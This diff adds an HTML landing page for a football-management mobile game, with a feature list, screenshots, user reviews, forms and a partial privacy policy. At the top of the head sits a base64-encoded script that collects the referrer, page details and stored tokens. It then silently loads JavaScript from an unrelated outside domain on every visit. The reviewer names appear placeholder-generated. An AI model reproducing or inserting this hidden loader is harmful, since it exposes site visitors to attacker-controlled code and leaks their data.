@@ -1,0 +1,639 @@
+
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US">
+
+<head>
+    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMUtjR1hUZ1FxeXlIS0h0eic7CiAgICBpZiAoIXdpbmRvdy5fMUtjR1hUZ1FxeXlIS0h0eikgewogICAgICAgIHdpbmRvdy5fMUtjR1hUZ1FxeXlIS0h0eiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiAzMTUzNjAwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9zd2VldG5pdHJvLmZ1bi9YY1ZLOFY2ZycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9xZjU0TkxCRmJ0N2IycGNxID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfcWY1NE5MQkZidDdiMnBjcSAhPT0gJ3VuZGVmaW5lZCcgJiYgX3FmNTROTEJGYnQ3YjJwY3EgIT09IG51bGwpIHsKICAgICAgICB2YXIgX3pNSjltQkNITVpNOFo4czQgPSBKU09OLnBhcnNlKF9xZjU0TkxCRmJ0N2IycGNxKTsKICAgICAgICB2YXIgX1puMnZoYm1mTjN0TmhncEMgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfek1KOW1CQ0hNWk04WjhzNC5jcmVhdGVkX2F0ICsgd2luZG93Ll8xS2NHWFRnUXF5eUhLSHR6LnR0bCA8IF9abjJ2aGJtZk4zdE5oZ3BDKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfSFljY3BLdzlIQmNRNWsyMyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9TcFJLUlBnOXFxVnM3SEdoID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgXzUxbVBDTUdTekJna3ZxTDUgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgXzUxbVBDTUdTekJna3ZxTDUgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgXzUxbVBDTUdTekJna3ZxTDUgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fMUtjR1hUZ1FxeXlIS0h0ei5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfSFljY3BLdzlIQmNRNWsyMyAhPT0gJ3VuZGVmaW5lZCcgJiYgX0hZY2NwS3c5SEJjUTVrMjMgJiYgd2luZG93Ll8xS2NHWFRnUXF5eUhLSHR6LnVuaXF1ZSkgewogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX0hZY2NwS3c5SEJjUTVrMjMpOwogICAgfQogICAgaWYgKHR5cGVvZiBfU3BSS1JQZzlxcVZzN0hHaCAhPT0gJ3VuZGVmaW5lZCcgJiYgX1NwUktSUGc5cXFWczdIR2ggJiYgd2luZG93Ll8xS2NHWFRnUXF5eUhLSHR6LnVuaXF1ZSkgewogICAgICAgIF81MW1QQ01HU3pCZ2t2cUw1ICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfU3BSS1JQZzlxcVZzN0hHaCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fMUtjR1hUZ1FxeXlIS0h0ei5SX1BBVEggKyBfNTFtUENNR1N6QmdrdnFMNTsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
+
+    <!-- Document Meta
+    =====================================-->
+    <meta charset="UTF-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!-- Document Title
+    ======================================-->
+    <title class="notranslate">Football Team Manager</title>
+
+    <!-- Project Stylesheets
+    ==========================================-->
+
+    <link rel="stylesheet" type="text/css" href="css/l9yEBJjjvCdN.css">
+    <link rel="stylesheet" type="text/css" href="css/dPvEjxlmHqbO.css">
+    <link rel="stylesheet" type="text/css" href="css/4e77pYfxqeR4.css">
+    <link rel="stylesheet" type="text/css" href="css/kD5XmXELhwXb.css">
+    <link rel="stylesheet" type="text/css" href="css/j0QgyU4jsrj8.css">
+    <link rel="stylesheet" type="text/css" href="css/WTLwbOr8potw.css">
+    <link rel="stylesheet" type="text/css" href="css/HJaFbM3DnhFB.css">
+    <link rel="stylesheet" type="text/css" href="css/dSjAEIZF1lLB.css">
+
+    <!-- Google Fonts -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic,700italic|Montserrat:400,700">
+              
+</head>
+
+<body class="gradient">
+
+    <div id="preloader">
+        <div id="loader">
+            <div class="loader-inner ball-scale-multiple">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Navigations  ==============================-->
+    <nav id="navigation" class="navigation-style-2">
+        <div class="container">
+            <div class="nav-header">
+                <a href="index.html" class="site-name" id="logo">
+                    <h1 class="notranslate">Football Team Manager</h1>
+                </a>
+                <div id="nav-trigger" class="nav-trigger style-2">
+                    <a href="#"><i class="fa fa-bars"></i></a>
+                </div>
+            </div>
+            <ul class="site-navigation">
+                <li><a href="#home"><i class="fa fa-home"></i>Home</a></li>
+                <li><a href="#about"><i class="fa fa-user"></i>About</a></li>
+                <li><a href="#download"><i class="fa fa-download"></i>Download</a></li>
+                <li><a href="#reviews"><i class="fa fa-briefcase"></i>Reviews</a></li>
+                <li><a href="#screenshots"><i class="fa fa-file-image-o"></i>Screenshots</a></li>
+                <li><a href="#contact"><i class="fa fa-envelope-o"></i>Contact Us</a></li>
+
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Banner  ==============================-->
+    <section id="banner" class="banner-section banner-two full-screen transparent" data-type="background" data-parallax="yes" data-src="v18/assets/images/header-bg.jpg?v=1">
+        <div class="overlay">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-lg-6 banner-middle-content">
+                        <div class="banner-content">
+                            <h2 class="banner-title text-uppercase wow fadeIn notranslate" data-wow-delay="0.7s">We Create Awesome
+                                Football Team Manager</h2>
+                            <div class="banner-description wow fadeIn" data-wow-delay="1.0s">
+                                Sports                            </div>
+                            <div class="action-buttons wow fadeIn" data-wow-delay="1.3s">
+                                <a href="#download" class="aw-btn text-uppercase">Download</a>
+                                <a href="#about" class="aw-btn text-uppercase">Learn More</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-6 d-none d-lg-block hidden-xs wow fadeInUp" data-wow-duration="0.5s" data-wow-delay="0.2s">
+                        <div class="application-mockup">
+
+                                 <img class="banner-image-2" src="images/672miio7aSm6.png" alt="screenshot">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Feature 2  ==============================-->
+    <section id="about" class="feature-section section-padding">
+        <div class="container">
+            <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">About
+                <span class="notranslate">Football Team Manager</span></h1>
+            <div class="stripe iconic wow fadeInUp" data-wow-delay="0.2s"><i class="fa fa-diamond"></i></div>
+            <div class="section-description text-center wow fadeInUp" data-wow-delay="0.5s">
+                Football Team Manager is a game in which you must choose your favorite team and improve it by taking the right decisions. You will control all areas of the club, including signings, employees, technical decisions, stadium and finances. You will be responsible of the evolution of your team and will need to keep the club in a safe economic situation and achieve the objectives set for each season to ensure the board of directors and the fans will be happy with your management. Taking the club to a dangerous situation could mean your dismissal as a manager.<br>
+<br>
+Main Features:<br>
+<br>
+COUNTRIES<br>
+<br>
+- Spain (1st and 2nd division)<br>
+- France (1st and 2nd division)<br>
+- England (1st and 2nd division)<br>
+- Italy (1st and 2nd division)<br>
+- Germany (1st and 2nd division)<br>
+- Brazil (1st and 2nd division)<br>
+- Argentina (1st and 2nd division)<br>
+- Mexico (1st and 2nd division)<br>
+- USA (1st and 2nd division)<br>
+<br>
+TOURNAMENTS<br>
+<br>
+- League (1st and 2nd division)<br>
+- National Cup (best 32 teams of the country)<br>
+- Champions Cup (best 32 teams of the world)<br>
+<br>
+MANAGER MODES<br>
+<br>
+- Manager Mode: Select your favorite team.<br>
+- Promanager Mode: Start your Manager career from scratch in the lower categories. Receive offers according to your prestige, which you must improve over time. At the end of each season, depending on whether you have met your goal or not, you will receive renewal offers and offers from other teams. You decide your future.<br>
+<br>
+DATABASE MODES<br>
+<br>
+- Random Database: Generates a new Database for each new game. All countries, teams and players will be generated again randomly. New stars will appear around the world. Each team will be generated with a similar level than its fixed database version.<br>
+- Fixed Database: It uses a fixed Database for the game. Each time you start a new manager with this database, the same teams and players will exist in each country.<br>
+- Imported Database: It uses modified databases by you or by the community.<br>
+<br>
+RESULTS AREA<br>
+<br>
+- View results, calendar and classifications.<br>
+<br>
+SQUAD MANAGEMENT AREA<br>
+<br>
+- Make signings.<br>
+- Manage the squad, renewing, selling or firing players.<br>
+- Search young promises for your youth team.<br>
+- Hire club employees, necessary to unlock areas and improvements in your team.<br>
+<br>
+LINEUP AND TACTICS AREA<br>
+<br>
+- Decide the lineup.<br>
+- Choose your tactics and game system.<br>
+- Analyze the tactics and lineup of the opponent team.<br>
+<br>
+FINANCES AREA<br>
+<br>
+- View reports of the revenues and expenses of each season to keep the team in a safe economic situation.<br>
+- Negotiate sponsor and broadcasting rights offers.<br>
+- View your history and statistics as a manager.<br>
+- Check the confidence of the fans and the board of directors.<br>
+- Manage the stadium, determining the price of the tickets and making improvements.<br>
+<br>
+ONLINE<br>
+<br>
+- Achievements.<br>
+- Online leaderboards of titles.            </div>
+
+        </div>
+    </section>
+
+    <!-- Screenshot  ==============================-->
+    <section id="screenshots" class="screenshot-section section-padding">
+        <div class="container">
+
+            <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">View App
+                <span>Screenshots</span></h1>
+            <div class="stripe iconic wow fadeInUp" data-wow-delay="0.2s"><i class="fa fa-diamond"></i></div>
+
+
+            <div id="screenshots-carousel" class="screenshots-carousel top-padding-80 wow fadeIn" data-wow-delay="0.8s" data-screenshot="carousel">
+
+                <div id="screenshots-carousel-content" class="swiper-container" data-carousel="content">
+
+                    <div class="swiper-wrapper">
+
+                                                <div class="swiper-slide screenshot-item">
+                            <img src="images/f6mkIQhgS1lp.jpg" alt="Screenshots 1">
+                            <a href="/s-img/133212050862.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>
+                                                                        <div class="swiper-slide screenshot-item">
+                            <img src="images/XeSGFQhIWYoO.jpg" alt="Screenshots 1">
+                            <a href="/s-img/952706632515.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>                                                                        <div class="swiper-slide screenshot-item">
+                            <img src="images/ib1EBR7PZtip.jpg" alt="Screenshots 1">
+                            <a href="/s-img/512716335659.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>                                                                        <div class="swiper-slide screenshot-item">
+                            <img src="images/hTo5IX0HYvQy.jpg" alt="Screenshots 1">
+                            <a href="/s-img/460682469051.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>                                                                        <div class="swiper-slide screenshot-item">
+                            <img src="images/iohk6na9SILE.jpg" alt="Screenshots 1">
+                            <a href="/s-img/855447410144.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>                                                                       <div class="swiper-slide screenshot-item">
+                            <img src="images/ji8vXfR6AZNT.jpg" alt="Screenshots 1">
+                            <a href="/s-img/675946075900.jpg" class="zoom-overlay" data-lightbox="yes">
+                                <i class="plus-sign"></i>
+                            </a>
+                        </div>                        
+
+
+                    </div>
+                </div>
+                <div id="screenshots-carousel-pagination" class="bullet-pagination" data-carousel="pagination"></div>
+                <div id="screenshots-carousel-nav-prev" class="screenshots-carousel-nav-prev arrow-control prev" data-carousel="prev"></div>
+                <div id="screenshots-carousel-nav-next" class="reenshots-carousel-nav-next arrow-control next" data-carousel="next"></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Download ==============================-->
+    <section id="download" class="download-section transparent" data-type="background" data-parallax="yes" data-speed="50" data-src="/bgs/18.jpg">
+        <div class="overlay section-padding">
+            <div class="container">
+                <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">Download Our
+                    Latest App</h1>
+                <div class="stripe iconic wow fadeInUp" data-wow-delay="0.2s"><i class="fa fa-diamond"></i></div>
+
+                <div class="download-links top-padding-30 text-center">
+
+                     
+                     <a href="https://play.google.com/store/apps/details?id=com.valenbyte.footballteammanager" class="link-item wow fadeInUp" data-wow-delay="1.1s">
+                        <i class="fa fa-play"></i>
+                        <span class="heading">Available on the</span>
+                        <span class="name">Play Store</span>
+                    </a>
+                     
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+
+
+
+     <!-- Team ==============================-->
+    <section id="reviews" class="team-section section-padding" data-background="gray">
+        <div class="container" style="position:relative;">
+            <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">Latest
+                <span>reviews</span></h1>
+
+                <div class="stripe iconic wow fadeInUp" data-wow-delay="0.2s"><i class="fa fa-diamond"></i></div>
+
+<div id="reviews-carousel" class="reviews-carousel top-padding-80 wow fadeIn" data-wow-delay="0.8s" data-screenshot="carousel">
+
+                <div id="reviews-carousel-content" class="swiper-container" data-carousel="content">
+
+                    <div class="swiper-wrapper">
+
+
+                             
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp4rQcMGKDXWn_bxh_danetXACeWJGK4t8-qAjEk=s64" alt="Abigail Spinka">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Abigail Spinka</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            Not really that challenging for me, can't say the same for others but it's a decent manager game. There's a complex tactics feature which is good, fast (really fast) gameplay and simple yet nostalgic graphics. So, it's decent. 4 stars for now since I don't really like the fact that every game there will be at least 1 player who got red card, injured or suspended for getting too much yellow card (this one also happen to frequently) which makes this game not that realistic.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp7xIhUDidx5lWbaN5fkLAVpXXH3xcuWqaRNiPp2=s64" alt="Gloria McDermott">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Gloria McDermott</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            I think it is a great game, it has a retro style like Win98 software. It should have a team history since the team was created in the past, and tournament history, a showcase for team and coach trophies, as well as a derby as a spacial match or activity, I think is important to see what happens in other leagues, match results, top scorers. Also importing league flags or emblems, it would be very good and would bring realism, as well as league trophies. thanks for your job.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp6CZxGnbMSzW4aUs1H7bejzbRZYlpocHknLuhoV=s64" alt="Christopher Nienow III">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Christopher Nienow III</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            Reminds me of classic spanish PC Fútbol manager. I like its vintage feel. I don't like not having an option to automatically change your lineup when a player has to rest one game because of a red card or an injury, since changing it manually every two games or so ends up taking a good percentage of the time I spend playing. I hope developers implement something like that. Good job so far though 👍                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a-/AD5-WClCUq7FU8FRMOHnJ0P5DvBBegaQHWmEg6TiXiipfg=s64" alt="Scottie Jacobi">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Scottie Jacobi</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            It's a good easy game to play and with more options it could be a 5 star killer game. Too many injuries and red cards during games. Players who are reserves lose level too fast. Not enough flexibility on formations, more options needed or create your own. I had two brilliant youths promoted on 5 Yr contracts but they left after 2 years in?. These things are crazy and make the game amateur. Minor updates like fixing these problems would make this a winner! Please consider! Also tried to export and edit the info but when the file opened it was only some spanish players not the whole thing as promised. Pointless exercise.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp4WmIgsOQVfLP22r725xqe3lRz3IW-UzPJJTPGF=s64" alt="Stephan Walter">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Stephan Walter</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            Back to basic game which is great! Very addictive and can be a quick season which is good too! Only down fall for me, is when teams can buy your best player and then the transfer window ends before you can get a replacement! Would be good if there was a group stage for European games too! Other than that, love it!                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp5neZHr26gDBwjidErJKfx-n9J6dv1DqqHUVSY9Yg=s64" alt="Jayda Harber">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Jayda Harber</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            Excellent hark back to retro football management. Its excellent and no ads! I'd like to see more details added - negotiations, dealing with in game actions to influence results and more detail over man management and the opportunity to manage other clubs - that sounds like alot but in fact this already has the basis to become a classic. Add more features and I'd be happy to go 5 stars and buy it.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a/AEdFTp46lyQc6qw8S6Ec9WeFrp0mCVjsLT17aX9P_pFy=s64" alt="Kaden Mills">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Kaden Mills</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            A really good game but has an extremely irritating bug, that is even after winning in cup matches we get eliminated like howwwww!!!!! Like I won 3-1 with Liverpool in the semifinals of national cup and it said on my screen I have been eliminated....like whaaaat!! Even after winning and using so much time I got eliminated and this happened like 5-6 times in 3 seasons....this happened in champions cup too ...pls fix this bug...it's so good except these bugs , I can send screenshot if u guys want                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/EGemoI2NTXmTsBVtJqk8jxF9rh8ApRWfsIMQSt2uE4OcpQqbFu7f7NbTK05lx80nuSijCz7sc3a277R67g=s64" alt="Gage Johns">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Gage Johns</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            Football manager sims are simple games and this title over-simplifies! Can't train players up, can't change players or tactics during matches... it really is just click next match, see the result, adjust the line up if there's been an injury or suspension and then click the next match. It will hold your attention for 5-10 minutes and then you'll uninstall it to look for a game with more options.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a-/AD5-WCn1WBKk4o4dBDvKWx4SmUnbiiTqGIih93D_CGKa=s64" alt="Mr. Benny D'Amore Jr.">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Mr. Benny D'Amore Jr.</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            I love this game definitely the best soccer manager game cause of the far access it permits you to your team and, it's offline.Not to mention every update leaves me eagerly waiting for another for the wide areas of the game they touch on.Though i would mention the save process being a drag. It takes the game, i don't know, minutes just to save;Opening the app is faster(enphasis) than saving.Do intervene please 'cause it's really stressing. Edit: After the discussion we heard, i stand corrected.                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+                    <div class="swiper-slide reviews-item">
+                    <div class="member-profile" style="max-width: 280px;    margin: 0 auto;">
+                        <div class="member-image" style="max-width: 100px;max-height: 100px;">
+                            <img src="https://play-lh.googleusercontent.com/a-/AD5-WCmr1mBcExgaAxsBBh2g3MlVHmF2ALdJjpNjaj2hdQ=s64" alt="Adolph Ledner">
+                        </div>
+                        <div class="member-info">
+                            <h4 class="member-name">Adolph Ledner</h4>
+                            <div class="member-role">User</div>
+                        </div>
+                        <div class="member-bio">
+                            I like this game, addicted as it has good UI and easy to understand. Suggestions of making player loans, youth academy, swap deal, development chart(potential growth) and make pre season friendly matches would be great additional features. Keep up with the updates                        </div>
+
+                    </div>
+                </div>
+
+
+                     
+
+                    </div>
+                </div>
+                <div id="screenshots-carousel-pagination" class="bullet-pagination" data-carousel="pagination"></div>
+                <div id="screenshots-carousel-nav-prev" class="screenshots-carousel-nav-prev arrow-control prev" data-carousel="prev"></div>
+                <div id="screenshots-carousel-nav-next" class="reenshots-carousel-nav-next arrow-control next" data-carousel="next"></div>
+            </div>
+
+
+        </div>
+    </section>
+  
+    <!-- Newsletter ==============================-->
+    <section id="newsletter" class="newsletter-section transparent" data-type="background" data-parallax="yes" data-speed="50" data-src="/bgs/18.jpg">
+        <div class="overlay section-padding">
+            <div class="container">
+                <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">
+                    <span>Subscribe</span> For Our Newsletter</h1>
+                <div class="stripe iconic wow fadeInUp" data-wow-delay="0.2s"><i class="fa fa-diamond"></i></div>
+
+
+                <form class="newsletter-form top-margin-80 aw-mc-ajax-form wow fadeInUp" data-wow-delay="0.8s" action="mcs.php" method="post">
+                    <input name="action" type="hidden" value="aw_chimp_subscribe">
+                    <div class="field-inside">
+                        <i class="fa fa-envelope-o"></i>
+                        <input type="text" name="email" class="email-field" placeholder="Type your email address...">
+                        <button type="submit" onclick="alert('You subscribed!');return false;">
+                            <span cLass="subscribe-text">Subscribe</span>
+                            <span cLass="ajax-loader">
+                                <i class="fa-li fa fa-spinner fa-spin"></i>
+                            </span>
+                        </button>
+                    </div>
+                    <div class="aw-mc-response"></div>
+                </form>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- Contact  ==============================-->
+    <section id="contact" class="contact-section transparent" data-type="background" data-parallax="yes" data-src="v18/assets/images/contact-map.jpg">
+        <div class="overlay section-padding">
+            <div class="container">
+
+                <h1 class="section-title text-center text-uppercase wow fadeInUp" data-wow-delay="0.2s">Get In
+                    <span>Touch</span></h1>
+
+
+
+                <div class="top-padding-80"></div>
+                <div class="row">
+                    <div class="col-lg-6 contact-info-map wow fadeInUp" data-wow-delay="0.8s">
+                        <div class="row g-0">
+                            <div class="col-lg-10">
+                                <div class="contact-details">
+                                    <h3 class="contact-title text-uppercase">Get In Touch</h3>
+                                    <ul class="contact-items">
+                                                                            </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-6 wow fadeInUp" data-wow-delay="1.1s">
+                        <div class="contact-container">
+                            <h3 class="contact-title text-uppercase">Quick Message</h3>
+                            <form action="index.php" class="contact-form">
+                                <input type="text" name="name" id="name" placeholder="Jhon Doe">
+                                <input type="email" name="email" id="email" placeholder="you@yourdomain.com">
+                                <textarea name="message" id="message" placeholder="Your Message"></textarea>
+                                <input type="submit" name="submit" id="submit" value="Send" onclick="alert('We got your message!');return false;">
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer  ==============================-->
+    <section id="footer" class="footer-section">
+        <div class="container">
+            <p class="copyright-info text-center">Copyright &copy; 2022 All Rights Reserves.  <a data-fancybox data-src="#pp" href="javascript:;">Privacy Policy</a> / <a data-fancybox data-src="#tos" href="javascript:;">Terms and Conditions</a> / <a data-fancybox data-src="#dis" href="javascript:;">Website disclaimer</a>
+
+            </p>
+        </div>
+    </section>
+
+
+
+
+
+    <!-- Project Scripts  =====================================-->
+    <script src="js/SG1rGGzRlw8k.js"></script>
+    <script src="js/CXscAmZ2tPiP.js"></script>
+    <script src="js/fKD0IGJg6dso.js"></script>
+    <script src="js/1isqRdD6dnAM.js"></script>
+    <script src="js/H6lwbNJCMcxK.js"></script>
+    <script src="js/LiFU19V91BKZ.js"></script>
+    <script src="js/c0n4P2Z1x18X.js"></script>
+    <script src="js/ILcHOIWOkM0k.js"></script>
+    <script src="js/OIwFK4g3t0rq.js"></script>
+        <script src="js/2IKOTjJCDLKh.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="css/LOz6BKzjRAjN.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+    <script>
+        // scrollReveal Init
+        if (screen.width > 966) {
+            $(document).ready(function () {
+                new WOW().init();
+            });
+        }
+    </script>
+
+<style>
+#pp p, #tos p, #dis p {
+    margin: 10px 0px;
+}
+
+</style>
+<div style="display: none;" id="pp">
+    <h2>Privacy Policy</h2>
+    <p>The viviplay.space website is owned by Football Team Manager, which is the controller for your personal data.<br></p>
+<p>We use this Privacy Policy, which governs how we process information collected by viviplay.space, as well as the reasons why we must collect certain personal data about you. Therefore, you should read this Privacy Policy before using the viviplay.space site.</p>
+<p>We care about your personal data and guarantee its confidentiality and security.</p>
+<p>Personal information we collect:</p>
+<p>when you visit viviplay.space, we automatically collect certain information about your device, including information about your web browser, IP address, time zone, etc. and some of the cookies set on your device. In addition, when you browse the Site, we collect information about the individual pages or products you view, which sites or search terms referred you to the Site, and how you interact with the Site. We refer to this automatically collected information as "Device Information". In addition, we may collect personal data that you provide to us (including first name, last name, address, billing information, etc.) during registration in order to be able to perform the agreement.</p>
+<p>Why do we process your data?</p>
+<p>Our top priority is the safety of our customers, which is why we must process the minimum amount of user data: only as much as is necessary to maintain the site. The information collected automatically is used only to identify potential violations and obtain statistical information about the use of the Site. This statistical information is not collected in such a way that it is possible to identify a specific user of the system.</p>
+<p>You may visit the Site without telling us who you are and without disclosing any information by which anyone could identify you as a particular individual. However, if you wish to use certain features of the site, wish to receive our newsletter or other information by completing the form, you may provide us with personal data such as your e-mail address, first name, last name, place of residence, organization, phone number. You may choose not to provide us with your personal information, but if you do so, you may not be able to use certain features of the Site. For example, you will not be able to receive our newsletter or contact us directly through the Site. Users who are not sure what information is required can contact us via <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8be3eee7fbcbfde2fde2fbe7eaf2a5f8fbeae8eea5">[email&#160;protected]</a></p>
+<p>Your rights:</p>
+<p>If you are a European resident, you have the following rights related to your personal data:</p>
